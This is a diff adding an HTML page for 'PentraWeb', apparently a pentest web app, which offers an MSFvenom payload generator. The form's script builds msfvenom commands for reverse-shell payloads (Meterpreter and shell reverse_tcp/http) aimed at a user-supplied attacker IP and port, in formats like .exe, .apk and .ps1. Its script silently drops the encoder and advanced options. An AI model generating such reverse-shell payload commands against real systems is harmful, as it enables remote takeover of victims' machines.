@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PentraWeb - MSFvenom Payload Generator</title>
+    <link rel="stylesheet" href="../Static/css/homepage.css"> <!-- Link to your main CSS file -->
+    <link rel="stylesheet" href="../Static/css/payloads.css"> <!-- Link to the MSFvenom Tool CSS file -->
+</head>
+<body>
+
+    <!-- Header Section -->
+    <header>
+        <div class="logo">
+            <h1>PentraWeb</h1>
+        </div>
+        <nav>
+            <ul>
+                <li><a href="homepage.html" style="color: aquamarine;">Home</a></li>
+                <li><a href="scanpage.html">Scan</a></li>
+                <li><a href="reportpage.html">Reports</a></li>
+                <li><a href="toolspage.html">Tools</a></li>
+                <li><a href="bookspage.html">Books</a></li>
+                <li><a href="ic_scada.html">IC & SCADA</a></li>
+                <li><a href="vulnerable_systems.html">Vulnerable Systems</a></li>
+                <li><a href="online_resources.html">Online Resources</a></li>
+                <li><a href="aboutpage.html">About</a></li>
+                <li><a href="loginpage.html">Login</a></li>
+            </ul>
+        </nav>
+    </header>
+
+
+    <!-- Main Section -->
+    <main>
+        <section class="msfvenom-tool">
+            <h2>MSFvenom Payload Generator</h2>
+            <p>Configure your payload options below. Ensure you have proper authorization to generate payloads.</p>
+            <form id="msfvenom-form" action="../Static/php/payload.php" method="POST">
+                <label for="payload-type">Select Payload Type:</label>
+                <select id="payload-type">
+                    <option value="windows/meterpreter/reverse_tcp">windows/meterpreter/reverse_tcp</option>
+                    <option value="windows/meterpreter/reverse_http">windows/meterpreter/reverse_http</option>
+                    <option value="windows/meterpreter/reverse_https">windows/meterpreter/reverse_https</option>
+                    <option value="linux/x86/shell_reverse_tcp">linux/x86/shell_reverse_tcp</option>
+                    <option value="linux/x64/meterpreter_reverse_tcp">linux/x64/meterpreter_reverse_tcp</option>
+                    <option value="android/meterpreter/reverse_tcp">android/meterpreter/reverse_tcp</option>
+                    <option value="osx/x86/shell_reverse_tcp">osx/x86/shell_reverse_tcp</option>
+                    <option value="php/meterpreter/reverse_tcp">php/meterpreter/reverse_tcp</option>
+                    <option value="python/meterpreter/reverse_tcp">python/meterpreter/reverse_tcp</option>
+                    <option value="java/meterpreter/reverse_tcp">java/meterpreter/reverse_tcp</option>
+                </select>
+                <label for="lhost">Enter Attacker IP Address (LHOST):</label>
+                <input type="text" id="lhost" placeholder="Enter Attacker IP Address" required>
+                <label for="lport">Enter Listener Port (LPORT):</label>
+                <input type="text" id="lport" placeholder="Enter Listener Port" required>
+                <label for="output-format">Select Output Format:</label>
+                <select id="output-format">
+                    <option value="exe">.exe</option>
+                    <option value="elf">.elf</option>
+                    <option value="raw">.raw</option>
+                    <option value="py">.py</option>
+                    <option value="apk">.apk</option>
+                    <option value="bat">.bat</option>
+                    <option value="jsp">.jsp</option>
+                    <option value="war">.war</option>
+                    <option value="ps1">.ps1</option>
+                </select>
+                <label for="encoder">Select Encoder:</label>
+                <select id="encoder">
+                    <option value="x86/shikata_ga_nai">x86/shikata_ga_nai</option>
+                    <option value="x86/xor">x86/xor</option>
+                    <option value="cmd/powershell_base64">cmd/powershell_base64</option>
+                    <option value="x64/xor_dynamic">x64/xor_dynamic</option>
+                </select>
+                <label for="iterations">Number of Iterations:</label>
+                <input type="number" id="iterations" placeholder="e.g., 3" min="1">
+                <div class="advanced-options">
+                    <h3>Advanced Options</h3>
+                    <label for="bad-chars">Bad Characters:</label>
+                    <input type="text" id="bad-chars" placeholder="e.g., \x00\x0a">
+                    <label for="architecture">Architecture:</label>
+                    <select id="architecture">
+                        <option value="x86">x86</option>
+                        <option value="x64">x64</option>
+                        <option value="armle">ARM (Little Endian)</option>
+                    </select>
+                    <label for="platform">Platform:</label>
+                    <select id="platform">
+                        <option value="windows">Windows</option>
+                        <option value="linux">Linux</option>
+                        <option value="android">Android</option>
+                        <option value="osx">Mac OS</option>
+                        <option value="php">PHP</option>
+                        <option value="java">Java</option>
+                        <option value="python">Python</option>
+                    </select>
+                </div>
+                <button type="submit" class="btn">Generate Payload</button>
+            </form>
+            <div id="payload-preview" style="display: none;">
+                <h3>Payload Preview</h3>
+                <code id="generated-command"></code>
+                <button class="btn" id="copy-command">Copy Command</button>
+            </div>
+            <p class="warning">Use this tool responsibly and only on systems you own or have explicit permission to test.</p>
+        </section>
+    </main>
+
+
+    <!-- Footer Section -->
+    <footer>
+        <div class="contact-info">
+            <p>Contact Information</p>
+            <p>Email: support@pentraweb.com</p>
+        </div>
+        <div class="legal">
+            <a href="privacy-policy.html">Privacy Policy</a>
+            <a href="terms-of-use.html">Terms of Use</a>
+        </div>
+    </footer>
+
+    <script>
+        document.getElementById('msfvenom-form').addEventListener('submit', function(event) {
+            event.preventDefault(); // Prevent default form submission
+
+            // Gather input values
+            const payloadType = document.getElementById('payload-type').value;
+            const lhost = document.getElementById('lhost').value;
+            const lport = document.getElementById('lport').value;
+            const outputFormat = document.getElementById('output-format').value;
+            const encoder = document.getElementById('encoder').value;
+            const iterations = document.getElementById('iterations').value;
+            const badChars = document.getElementById('bad-chars').value;
+            const architecture = document.getElementById('architecture').value;
+            const platform = document.getElementById('platform').value;
+
+            // Generate the msfvenom command
+            const command = `msfvenom -p ${payloadType} LHOST=${lhost} LPORT=${lport} -f ${outputFormat} -o payload.${outputFormat}`;
+            document.getElementById('generated-command').innerText = command;
+
+            // Show the payload preview section
+            document.getElementById('payload-preview').style.display = 'block';
+        });
+
+        document.getElementById('copy-command').addEventListener('click', function() {
+            const command = document.getElementById('generated-command').innerText;
+            navigator.clipboard.writeText(command).then(() => {
+                alert('Command copied to clipboard!');
+            });
+        });
+    </script>
+
+</body>
+</html>
